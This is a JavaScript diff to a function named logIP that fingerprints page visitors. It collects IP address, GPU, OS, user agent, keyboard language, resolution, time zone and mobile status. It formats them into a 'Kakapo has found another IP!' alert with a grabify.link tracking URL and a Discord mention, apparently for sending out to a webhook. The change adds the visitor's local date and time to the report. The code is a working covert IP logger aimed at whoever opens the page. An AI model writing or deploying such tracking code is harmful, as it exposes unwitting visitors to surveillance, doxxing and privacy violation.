@@ -107,8 +107,35 @@ async function logIP() {
     const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;	
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-    const message = `The Kakapo has found another IP!\n\nCheck here to see all IPs logged: https://grabify.link/track/QRUKDR\n<@267417391053537280>\n Graphics Card: ${graphCard}\n IP: ${ip}\n OS: ${userOS}\n User Agent: ${userAgent}\n Keyboard Language: ${kbLang}\n Resolution: ${screenResolution}\n Time Zone: ${userTimeZone}\n Mobile User: ${isMobile} `;
 
+
+const userTime = new Date();
+const year = userTime.getFullYear();
+const month = userTime.getMonth() + 1;
+const day = userTime.getDate();
+const hours24 = userTime.getHours();
+const hours12 = (hours24 % 12) || 12; // Convert to 12-hour format
+const minutes = userTime.getMinutes();
+const seconds = userTime.getSeconds();
+const milliseconds = userTime.getMilliseconds();
+const ampm = hours24 >= 12 ? 'PM' : 'AM';
+
+const message = `
+The Kakapo has found another IP!
+Check here to see all IPs logged: https://grabify.link/track/QRUKDR
+<@267417391053537280>
+
+- Graphics Card: ${graphCard}
+- IP: ${ip}
+- OS: ${userOS}
+- User Agent: ${userAgent}
+- Keyboard Language: ${kbLang}
+- Resolution: ${screenResolution}
+- Time Zone: ${userTimeZone}
+- Mobile User: ${isMobile}
+- User Date and Time: ${day}/${month}/${year} ${hours24}:${minutes}:${seconds}.${milliseconds} (${hours12}:${minutes}:${seconds} ${ampm})
+`;
+	  
     const msg = {
       content: message
     };
